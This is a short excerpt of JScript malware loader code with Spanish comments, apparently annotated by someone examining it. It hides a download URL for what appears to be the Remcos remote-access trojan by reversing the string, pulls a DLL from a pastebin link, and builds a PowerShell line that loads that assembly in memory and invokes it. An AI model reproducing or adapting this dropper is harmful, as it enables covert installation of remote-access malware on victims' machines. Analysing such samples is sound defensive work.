...
var JsAEq // servidor
JsAEq = ("txt.remcos/niam/tidua/olamotnas/moc.tnetnocresubuhtig.war//:sptth"); //servidor tiene reverse string

var FmNKe // dll 
FmNKe = dLsgD(dLsgD("https://pastebin.com/raw/16APD4C6"));
...
FCeFi = FCeFi + "[System.AppDomain]::CurrentDomain.Load($EuKVK).GetType('CdWDdB.DKeSvl').GetMethod('NnIaUq').Invoke($null, [object[]] ('" + JsAEq + "' , '" + WScript.ScriptFullName + "' , " + "''" + ", '000', '1', 'Roda' " + " ) );";
